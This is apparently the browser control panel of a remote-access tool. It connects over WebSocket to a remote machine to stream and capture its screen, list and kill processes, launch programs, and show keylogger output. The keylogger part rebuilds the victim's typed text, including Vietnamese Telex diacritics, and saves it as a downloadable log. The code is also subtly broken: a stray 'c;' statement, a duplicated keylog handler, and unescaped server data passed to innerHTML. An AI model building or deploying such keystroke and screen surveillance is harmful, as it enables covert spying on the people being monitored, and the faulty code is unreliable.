let socket = null;
let objectUrl = null;
let currentViewMode = "apps"; // Mặc định xem Apps
let allInstalledApps = []; // Danh sách ứng dụng cài đặt

// --- 1. KẾT NỐI SERVER ---
function initiateConnection() {
  const ip = document.getElementById("server-ip").value.trim();
  const port = document.getElementById("server-port").value.trim();
  const pass = document.getElementById("auth-pass").value.trim();
  const errorLabel = document.getElementById("login-error");

  if (!ip || !port) {
    errorLabel.textContent = "Please enter IP and Port!";
    return;
  }

  errorLabel.textContent = "Connecting...";

  try {
    socket = new WebSocket(`ws://${ip}:${port}`);
    socket.binaryType = "arraybuffer"; // Nhận dữ liệu Stream

    socket.onopen = () => {
      // Gửi gói tin AUTH
      const authPacket = JSON.stringify({ type: "AUTH", payload: pass });
      socket.send(authPacket);
    };

    socket.onmessage = (event) => {
      if (event.data instanceof ArrayBuffer) {
        handleBinaryStream(event.data);
      } else {
        handleJsonData(event.data);
      }
    };

    socket.onclose = () => handleDisconnect();
    socket.onerror = () => {
      errorLabel.textContent = "Connection Error!";
    };
  } catch (e) {
    errorLabel.textContent = "Invalid IP Address!";
  }
}

function handleDisconnect() {
  document.getElementById("main-interface").classList.add("disabled-ui");
  const overlay = document.getElementById("login-overlay");
  overlay.style.display = "flex";
  overlay.style.opacity = "1";

  document.getElementById("login-error").textContent =
    "Disconnected from Server.";

  const badge = document.getElementById("connectionBadge");
  badge.className = "status-badge status-offline";
  badge.innerHTML = '<i class="fas fa-circle"></i> Disconnected';

  if (objectUrl) URL.revokeObjectURL(objectUrl);
  if (socket) socket.close();
}

// --- 2. XỬ LÝ DỮ LIỆU TỪ SERVER (QUAN TRỌNG NHẤT) ---
function handleJsonData(jsonString) {
  try {
    const msg = JSON.parse(jsonString);

    switch (msg.type) {
      // [QUAN TRỌNG] Xử lý Đăng nhập
      case "AUTH_RESULT":
        if (msg.payload === "OK") {
          // Ẩn màn hình Login
          const overlay = document.getElementById("login-overlay");
          overlay.style.opacity = "0";
          setTimeout(() => {
            overlay.style.display = "none";
            document
              .getElementById("main-interface")
              .classList.remove("disabled-ui");
          }, 500);

          // Cập nhật trạng thái
          const badge = document.getElementById("connectionBadge");
          badge.className = "status-badge status-online";
          badge.innerHTML = '<i class="fas fa-circle"></i> Online';

          logToTerminal("System Connected.", "system");
          showToast("Connected to Server!", "success");

          // Tự động lấy danh sách ứng dụng
          getApps();
        } else {
          document.getElementById("login-error").textContent =
            "Wrong Password!";
          showToast("Login Failed!", "error");
          socket.close();
        }
        break;

      // Xử lý Ảnh chụp màn hình
      case "SCREEN_CAPTURE":
        c; // 1. Lấy dữ liệu ảnh
        const imgSrc = "data:image/jpeg;base64," + msg.payload;

        // 2. Hiển thị vào khung Preview bên phải (Thay vì khung Stream)
        const previewImg = document.getElementById("captured-preview");
        const previewText = document.getElementById("preview-text");
        const saveBadge = document.getElementById("save-badge");

        if (previewImg) {
          previewImg.src = imgSrc;
          previewImg.classList.remove("hidden");
          previewText.style.display = "none"; // Ẩn chữ "Chưa có ảnh"
          saveBadge.classList.remove("hidden"); // Hiện chữ "Saved"

          // Hiệu ứng nháy nhẹ để biết ảnh mới
          previewImg.style.opacity = "0.5";
          setTimeout(() => (previewImg.style.opacity = "1"), 300);
        }

        // (Tùy chọn) Vẫn hiện thông báo Toast
        if (typeof showToast === "function")
          showToast("Ảnh đã được lưu và gửi về!", "success");
        break;

      // Xử lý Log & Thông báo
      case "LOG":
        const text = msg.payload;
        if (text.startsWith("[Keylogger]")) {
          // Nếu là tin Keylogger -> Xử lý riêng
          handleKeylogData(text.replace("[Keylogger] ", ""));
        } else {
          // Nếu là tin hệ thống -> Ghi vào log bên trái
          logToTerminal(text, "info");

          // Hiện Toast
          if (text.includes("Đã diệt") || text.includes("Đã mở")) {
            showToast(text, "success");
          } else if (text.includes("Lỗi")) {
            showToast(text, "error");
          }
        }
        break;

      // Xử lý Danh sách App & Process
      case "APP_LIST":
        if (currentViewMode === "apps") renderProcessTable(msg.payload);
        break;

      case "PROCESS_LIST":
        if (currentViewMode === "processes") renderProcessTable(msg.payload);
        break;

      // [MỚI] Xử lý Danh sách cài đặt (Library)
      case "INSTALLED_LIST":
        allInstalledApps = msg.payload;
        renderAppGrid(allInstalledApps);
        break;
    }
  } catch (e) {
    console.error("JSON Error:", e);
  }
}

function handleBinaryStream(arrayBuffer) {
  if (objectUrl) URL.revokeObjectURL(objectUrl);
  const blob = new Blob([arrayBuffer], { type: "image/jpeg" });
  objectUrl = URL.createObjectURL(blob);
  const img = document.getElementById("live-screen");
  img.src = objectUrl;
  img.style.display = "block";
  document.getElementById("screen-placeholder").style.display = "none";
  document.getElementById("monitorStatus").innerText = "Live Streaming";
}

// --- 3. GỬI LỆNH (COMMANDS) ---
function sendCmd(command, param = "") {
  if (socket && socket.readyState === WebSocket.OPEN) {
    socket.send(JSON.stringify({ command: command, param: param.toString() }));
  }
}

function sendCommand(cmd) {
  sendCmd(cmd);
}
function getProcesses() {
  currentViewMode = "processes";
  sendCmd("GET_PROCESS");
}
function getApps() {
  currentViewMode = "apps";
  sendCmd("GET_APPS");
}

function startApp() {
  const input = document.getElementById("quickAppInput");
  const appName = input.value.trim();
  if (appName) {
    sendCmd("START_APP", appName);
    logToTerminal(`Command: Start ${appName}`);
    input.value = "";
  } else {
    showToast("Vui lòng nhập tên ứng dụng!", "error");
  }
}

function openWeb(url) {
  sendCmd("START_APP", url);
  logToTerminal(`Command: Open Browser > ${url}`);
  showToast(`Opening ${url}...`, "info");
}

function disconnect() {
  if (socket) socket.close();
}

// --- 4. APP LIBRARY (TÍNH NĂNG MỚI) ---
function browseApps() {
  document.getElementById("app-library-modal").classList.remove("hidden");
  sendCmd("GET_INSTALLED");
}

function closeAppLibrary() {
  document.getElementById("app-library-modal").classList.add("hidden");
}

function renderAppGrid(appList) {
  const container = document.getElementById("app-grid");
  container.innerHTML = "";
  if (!appList || appList.length === 0) {
    container.innerHTML = '<p class="text-center w-100">No apps found.</p>';
    return;
  }
  appList.forEach((app) => {
    const div = document.createElement("div");
    div.className = "app-item-btn";
    div.onclick = () => {
      sendCmd("START_APP", app.path);
      closeAppLibrary();
      showToast(`Launching ${app.name}...`, "success");
    };
    div.innerHTML = `<i class="fas fa-cube app-item-icon"></i><span class="app-item-name">${app.name}</span>`;
    container.appendChild(div);
  });
}

function filterApps() {
  const keyword = document.getElementById("appSearch").value.toLowerCase();
  const filtered = allInstalledApps.filter((app) =>
    app.name.toLowerCase().includes(keyword)
  );
  renderAppGrid(filtered);
}

// --- 5. UI HELPERS ---
function showToast(message, type = "info") {
  const container = document.getElementById("toast-container");
  if (!container) return; // Tránh lỗi nếu chưa thêm div vào HTML

  const toast = document.createElement("div");
  toast.className = `toast-msg ${type}`;
  let icon =
    type === "success"
      ? "check-circle"
      : type === "error"
      ? "exclamation-circle"
      : "info-circle";
  let color =
    type === "success"
      ? "text-success"
      : type === "error"
      ? "text-danger"
      : "text-primary";

  toast.innerHTML = `<i class="fas fa-${icon} ${color}"></i> <span>${message}</span>`;
  container.appendChild(toast);

  setTimeout(() => {
    toast.style.animation = "fadeOut 0.5s ease-out forwards";
    setTimeout(() => toast.remove(), 500);
  }, 3000);
}

function switchTab(tabName, element) {
  document
    .querySelectorAll(".list-group-item")
    .forEach((el) => el.classList.remove("active"));
  element.classList.add("active");
  document
    .querySelectorAll(".tab-content")
    .forEach((el) => el.classList.remove("active"));
  document.getElementById(`tab-${tabName}`).classList.add("active");

  const titles = {
    dashboard: "Overview",
    monitor: "Screen Monitor",
    processes: "Task Manager",
    terminal: "Terminal & Logs",
  };
  document.getElementById("pageTitle").innerText = titles[tabName];
}

function renderProcessTable(dataList) {
  const tbody = document.querySelector("#procTable tbody");
  tbody.innerHTML = "";
  dataList.forEach((item) => {
    const tr = document.createElement("tr");
    const displayName = item.title || item.name;
    tr.innerHTML = `
            <td><span class="badge bg-secondary">${item.id}</span></td>
            <td class="fw-bold">${displayName}</td>
            <td>${item.memory || "N/A"}</td>
            <td>
                <button class="btn btn-danger btn-sm" onclick="if(confirm('Kill ID ${
                  item.id
                }?')) sendCmd('KILL', '${item.id}')">
                    <i class="fas fa-trash"></i> Kill
                </button>
            </td>
        `;
    tbody.appendChild(tr);
  });
}

function logToTerminal(text, type = "info") {
  const term = document.getElementById("terminal-output");
  if (type === "keylog") {
    const key = text.replace("[Keylogger] ", "");
    const displayKey = key.length > 1 ? ` [${key}] ` : key;
    if (
      term.lastChild &&
      term.lastChild.classList &&
      term.lastChild.classList.contains("keylog-stream")
    ) {
      term.lastChild.textContent += displayKey;
    } else {
      const div = document.createElement("div");
      div.className = "keylog-stream";
      div.style.color = "#fbbf24";
      div.textContent = `> ${displayKey}`;
      term.appendChild(div);
    }
  } else {
    const div = document.createElement("div");
    div.style.color = type === "system" ? "#3b82f6" : "#10b981";
    div.textContent = `[${new Date().toLocaleTimeString()}] > ${text}`;
    term.appendChild(div);
  }
  term.scrollTop = term.scrollHeight;
}

function viewFullImage(imgElement) {
  const w = window.open("");
  w.document.write(`<img src="${imgElement.src}" style="width:100%">`);
}

// Thay thế hoặc thêm mới hàm này vào script.js
function handleKeylogData(dataString) {
  // dataString có dạng: "LShiftKey|||" hoặc "A|||a" hoặc "Return|||<ENTER>"
  const parts = dataString.split("|||");
  const rawKey = parts[0]; // Ví dụ: LShiftKey
  const translatedChar = parts[1]; // Ví dụ: "" hoặc "a" hoặc "<ENTER>"

  // 1. Xử lý Ô Phím Thô (Raw Keys)
  const rawContainer = document.getElementById("raw-key-output");
  const span = document.createElement("span");
  span.className = "key-badge";
  span.innerText = rawKey;

  // Tô màu cho đẹp
  if (["Enter", "Back", "Delete", "Escape"].includes(rawKey))
    span.classList.add("special");
  if (
    rawKey.includes("Shift") ||
    rawKey.includes("Control") ||
    rawKey.includes("Alt")
  )
    span.classList.add("mod");

  rawContainer.appendChild(span);
  rawContainer.scrollTop = rawContainer.scrollHeight; // Auto scroll

  // 2. Xử lý Ô Văn Bản (Word Editor) - Chỉ xử lý nếu có translatedChar
  if (translatedChar) {
    const editor = document.getElementById("keylogger-editor");

    if (translatedChar === "<BACK>") {
      editor.value = editor.value.slice(0, -1);
    } else if (translatedChar === "<ENTER>") {
      editor.value += "\n";
    } else if (translatedChar === "<TAB>") {
      editor.value += "    ";
    } else {
      editor.value += translatedChar;
    }
    editor.scrollTop = editor.scrollHeight;
  }
}

// --- 1. TẢI FILE LOG ---
function downloadLog() {
  const content = document.getElementById("keylogger-editor").value;
  if (!content) {
    showToast("Chưa có nội dung!", "error");
    return;
  }

  const time = new Date()
    .toISOString()
    .slice(0, 19)
    .replace(/:/g, "-")
    .replace("T", "_");
  const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = `RCS_Log_${time}.txt`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  showToast("Đang tải xuống...", "success");
}

// --- Cấu hình Telex ---
const TELEX_MAPPING = {
  // Nguyên âm ghép
  aw: "ă",
  aa: "â",
  dd: "đ",
  ee: "ê",
  oo: "ô",
  ow: "ơ",
  uw: "ư",
  // Logic ươ
  uow: "ươ",
  uwo: "ươ",
  // Dấu thanh (s: sắc, f: huyền, r: hỏi, x: ngã, j: nặng)
  tone: { s: 1, f: 2, r: 3, x: 4, j: 5 },
};

// Bảng nguyên âm có dấu
const VOWEL_TABLE = [
  // 0: Không, 1: Sắc, 2: Huyền, 3: Hỏi, 4: Ngã, 5: Nặng
  ["a", "á", "à", "ả", "ã", "ạ"],
  ["ă", "ắ", "ằ", "ẳ", "ẵ", "ặ"],
  ["â", "ấ", "ầ", "ẩ", "ẫ", "ậ"],
  ["e", "é", "è", "ẻ", "ẽ", "ẹ"],
  ["ê", "ế", "ề", "ể", "ễ", "ệ"],
  ["i", "í", "ì", "ỉ", "ĩ", "ị"],
  ["o", "ó", "ò", "ỏ", "õ", "ọ"],
  ["ô", "ố", "ồ", "ổ", "ỗ", "ộ"],
  ["ơ", "ớ", "ờ", "ở", "ỡ", "ợ"],
  ["u", "ú", "ù", "ủ", "ũ", "ụ"],
  ["ư", "ứ", "ừ", "ử", "ữ", "ự"],
  ["y", "ý", "ỳ", "ỷ", "ỹ", "ỵ"],
];

// Hàm tìm và xử lý dấu tiếng Việt trong từ
function applyTelex(text, char) {
  if (char === "<BACK>") return text.slice(0, -1);
  if (char === "<ENTER>") return text + "\n";
  if (char === "<TAB>") return text + "    ";

  if (!/^[a-zA-Z0-9]$/.test(char)) return text + char;

  // Tách từ cuối cùng để xử lý
  let lastSpace = Math.max(text.lastIndexOf(" "), text.lastIndexOf("\n"));
  let prefix = text.substring(0, lastSpace + 1); // Phần trước từ đang gõ
  let word = text.substring(lastSpace + 1); // Từ đang gõ (ví dụ: "tôi")

  let newWord = word + char;
  let lowerChar = char.toLowerCase();

  // 1. Xử lý "Bỏ dấu" hoặc "Gõ đè dấu" (Toggle Tone)
  // Ví dụ: "tốt" + "s" -> "tốts" (Bỏ dấu sắc cũ, thêm s)
  // Ví dụ: "tốt" + "f" -> "tồt" (Thay sắc bằng huyền)
  if (TELEX_MAPPING.tone[lowerChar]) {
    let toneMark = TELEX_MAPPING.tone[lowerChar]; // 1, 2, 3...

    // Kiểm tra xem trong từ đã có ký tự nào mang dấu chưa
    let toneInfo = findToneInWord(word);

    if (toneInfo) {
      // Nếu từ ĐÃ CÓ dấu
      let [charIndex, currentTone, baseChar] = toneInfo;

      if (currentTone === toneMark) {
        // CASE 1: Gõ trùng dấu cũ -> XÓA DẤU (Undo)
        // Ví dụ: "tốt" (sắc) + "s" -> "tot" + "s" -> "tots"
        let cleanWord = replaceCharInString(word, charIndex, baseChar);
        return prefix + cleanWord + char;
      } else {
        // CASE 2: Gõ dấu khác -> ĐỔI DẤU
        // Ví dụ: "tốt" (sắc) + "f" -> "tồt"
        let newCharWithTone = getCharWithTone(baseChar, toneMark);
        // Giữ Case (Hoa/Thường)
        if (word[charIndex] === word[charIndex].toUpperCase())
          newCharWithTone = newCharWithTone.toUpperCase();

        let newWordReplaced = replaceCharInString(
          word,
          charIndex,
          newCharWithTone
        );
        return prefix + newWordReplaced;
      }
    } else {
      // Nếu từ CHƯA CÓ dấu -> THÊM DẤU VÀO NGUYÊN ÂM HỢP LÝ
      let targetIndex = findVowelToPlaceTone(word);
      if (targetIndex !== -1) {
        let baseChar = word[targetIndex];
        let newCharWithTone = getCharWithTone(baseChar, toneMark);
        if (baseChar === baseChar.toUpperCase())
          newCharWithTone = newCharWithTone.toUpperCase();

        let newWordReplaced = replaceCharInString(
          word,
          targetIndex,
          newCharWithTone
        );
        return prefix + newWordReplaced;
      }
    }
  }

  // 2. Xử lý ký tự đặc biệt (â, ă, đ, ê, ô, ơ, ư) và ươ
  // Check 3 ký tự cuối cho trường hợp 'uow' -> 'ươ'
  let last3 = (word + char).slice(-3).toLowerCase();
  if (last3 === "uow" || last3 === "uwo") {
    // Tìm 'uo' hoặc 'uw' ở cuối từ gốc để thay thế
    // Đơn giản hóa: Nếu kết thúc bằng uow -> thay 3 ký tự cuối bằng ươ
    return prefix + (word + char).slice(0, -3) + "ươ";
  }

  // Check 2 ký tự cuối (aa -> â, dd -> đ...)
  let last2 = (word + char).slice(-2).toLowerCase();

  // Logic Toggle đặc biệt cho ký tự kép: dd -> đ, nhưng đ + d -> dd
  // Nếu từ kết thúc bằng 'đ' và gõ thêm 'd' -> revert về 'dd'
  if (lowerChar === "d" && word.endsWith("đ")) {
    return prefix + word.slice(0, -1) + "dd";
  }
  // Nếu từ kết thúc bằng 'â' và gõ thêm 'a' -> revert về 'aa'
  if (lowerChar === "a" && word.endsWith("â")) {
    return prefix + word.slice(0, -1) + "aa";
  }
  // (Tương tự cho ee, oo...)

  // Logic tạo ký tự kép: a+a -> â
  if (TELEX_MAPPING[last2]) {
    let replaceChar = TELEX_MAPPING[last2];
    // Giữ case ký tự đầu
    let firstOfPair = (word + char).slice(-2)[0];
    if (firstOfPair === firstOfPair.toUpperCase())
      replaceChar = replaceChar.toUpperCase();

    return prefix + word.slice(0, -1) + replaceChar; // Bỏ ký tự cuối của word, thay bằng ký tự mới
  }

  // 3. Xử lý 'w' riêng lẻ (u+w -> ư, o+w -> ơ, a+w -> ă)
  if (lowerChar === "w") {
    let lastChar = word.slice(-1);
    if (lastChar.toLowerCase() === "u")
      return prefix + word.slice(0, -1) + (lastChar === "U" ? "Ư" : "ư");
    if (lastChar.toLowerCase() === "o")
      return prefix + word.slice(0, -1) + (lastChar === "O" ? "Ơ" : "ơ");
    if (lastChar.toLowerCase() === "a")
      return prefix + word.slice(0, -1) + (lastChar === "A" ? "Ă" : "ă");
  }

  return text + char;
}

// -- Helpers cho xử lý dấu --
function findToneInWord(word) {
  for (let i = 0; i < word.length; i++) {
    let char = word[i].toLowerCase();
    for (let row of VOWEL_TABLE) {
      // Bỏ qua cột 0 (không dấu)
      for (let t = 1; t < row.length; t++) {
        if (row[t] === char) {
          return [i, t, row[0]]; // [Vị trí, Loại dấu, Ký tự gốc]
        }
      }
    }
  }
  return null;
}

function findVowelToPlaceTone(word) {
  const lowerWord = word.toLowerCase();

  // 0. Ưu tiên đặc biệt cho cặp "ươ" (bỏ dấu vào ơ) [MỚI]
  // Ví dụ: trương + f -> trường (thay vì trừơng)
  if (lowerWord.includes("ươ")) {
    return lowerWord.indexOf("ươ") + 1; // Trả về vị trí của 'ơ'
  }

  // 1. Ưu tiên tuyệt đối: Các nguyên âm đã có dấu mũ/móc (ê, ô, ơ, â, ă, ư)
  const priority = ["ê", "ô", "ơ", "â", "ă", "ư"];
  for (let i = 0; i < word.length; i++) {
    if (priority.includes(lowerWord[i])) return i;
  }

  // 2. Xử lý các trường hợp ngoại lệ (oa, oe, uy -> bỏ dấu vào ký tự thứ 2)
  const exceptions = ["oa", "oe", "uy"];
  for (let exc of exceptions) {
    if (lowerWord.includes(exc)) {
      return lowerWord.indexOf(exc) + 1;
    }
  }

  // 3. Xử lý phụ âm đầu đặc biệt (qu, gi)
  let startIdx = 0;
  if (lowerWord.startsWith("qu") || lowerWord.startsWith("gi")) {
    if (/[ueoaiy]/.test(lowerWord.slice(2))) {
      startIdx = 2;
    }
  }

  // 4. Quét nguyên âm thường
  const normal = ["a", "e", "o", "u", "i", "y"];
  for (let i = startIdx; i < word.length; i++) {
    if (normal.includes(lowerWord[i])) return i;
  }

  return -1;
}

function getCharWithTone(baseChar, toneIndex) {
  for (let row of VOWEL_TABLE) {
    if (row[0] === baseChar.toLowerCase()) {
      return row[toneIndex];
    }
  }
  return baseChar;
}

function replaceCharInString(str, index, replacement) {
  return str.substring(0, index) + replacement + str.substring(index + 1);
}

function handleKeylogData(dataString) {
  let rawKey = dataString;
  let translatedChar = "";

  if (dataString.includes("|||")) {
    const parts = dataString.split("|||");
    rawKey = parts[0];
    translatedChar = parts[1];
  }

  // Cập nhật Raw Key
  const rawContainer = document.getElementById("raw-key-output");
  if (rawContainer) {
    const span = document.createElement("span");
    span.className = "key-badge";
    span.innerText = rawKey;
    if (["Enter", "Back", "Delete"].includes(rawKey))
      span.classList.add("special");
    if (rawKey.includes("Shift") || rawKey.includes("Control"))
      span.classList.add("mod");
    rawContainer.appendChild(span);
    rawContainer.scrollTop = rawContainer.scrollHeight;
  }

  // Cập nhật Văn bản với Logic Telex Pro
  if (translatedChar) {
    const editor = document.getElementById("keylogger-editor");
    if (editor) {
      editor.value = applyTelex(editor.value, translatedChar);
      editor.scrollTop = editor.scrollHeight;
    }
  }
}
